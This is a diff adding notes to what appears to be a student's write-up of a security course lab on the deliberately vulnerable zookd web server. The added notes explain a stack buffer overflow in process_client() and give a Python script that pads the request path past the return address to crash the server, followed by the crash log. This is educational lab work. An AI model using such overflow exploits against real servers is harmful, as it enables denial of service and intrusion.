@@ -60,3 +60,27 @@
     $ ./exploit-template.py localhost 8080
     ```
 - `gdb` is useful in building our exploits, we can attach it to an already-running process with `gdb -p $(pgrep zookd-)`. By default, `gdb` continues to debug parent process and does not attach to the child when the process forks. We can using the command `set follow-fork-mode child` to attach `gdb` to the child process, we can add it to `~/lab/.gdbinit`
+
+- *exploitation (simple version)*: crash the server or one of the processes it creates. We just need to pad enough bytes into the request path to overwrite the return address of function `process_client()`. Inside `process_client()`, there are 2 stack variables, a buffer of 4096 bytes and a pointer of 8 bytes. And the previous `rbp` (8 bytes) is in the stack frame of `process_client()`. And finally, the next 8 bytes is the return address. Since there is a `/` in the request path, we directly pad at least `4096+8+8+7` none-zero bytes (because inside `url_decode()`, the decoding and copying process stops when it sees `\0`). Core code:
+    ```
+    def build_exploit(payload):
+        req =   b"GET /" + payload + b" HTTP/1.0\r\n" + \
+                b"\r\n"
+        return req
+        
+    def create_padding(pad_len, pad_byte = b'\x90'):
+        padding = b''
+        for i in range(pad_len):
+            padding = padding + pad_byte
+        return padding
+
+    req = build_exploit(create_padding(4096 + 8 + 8 + 7))
+    resp = send_req(sys.argv[1], int(sys.argv[2]), req) # send_req() is provided in the template
+    ```
+    ```
+    (server side)
+    zookd-exstack: [4710] Request failed: Request too long
+    Child process 4710 terminated incorrectly, receiving signal 4
+    ```
+
+## Part 2: Code injection
